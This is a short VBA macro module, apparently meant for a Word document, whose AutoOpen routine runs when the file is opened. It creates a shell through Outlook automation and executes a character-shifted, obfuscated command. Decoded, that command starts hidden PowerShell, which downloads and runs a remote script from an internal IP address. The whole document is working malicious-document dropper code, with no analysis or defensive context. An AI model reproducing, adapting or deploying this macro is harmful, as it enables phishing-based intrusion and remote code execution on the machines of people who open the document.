Function rtn2(data As String)

    For Counter = 1 To Len(data)
        encChar = Mid(data, Counter, 1)
        charCode = Asc(encChar)
        newCharCode = charCode - 3
        newStr = newStr + Chr(newCharCode)
    Next Counter

    rtn2 = newStr

End Function
Sub rtn1()

    Dim damnCmd As String
    
    Set damnOL = CreateObject("Outlook.Application")

    Set DamnSh = damnOL.CreateObject("WScript.Shell")
    
    damnCmd = "srzhuvkhoo#0ZlqgrzVw|oh#Klgghq#%LH[+Qhz0Remhfw#Qhw1ZheFolhqw,1grzqordgVwulqj+*kwws=224<5149;143145;2sdbilohv2whvw1sv4*,%"
    
    damnCmd_2 = rtn2(damnCmd)
    
    Set DamnShEx = DamnSh.Exec(damnCmd_2)

End Sub
Sub AutoOpen()

    rtn1

End Sub

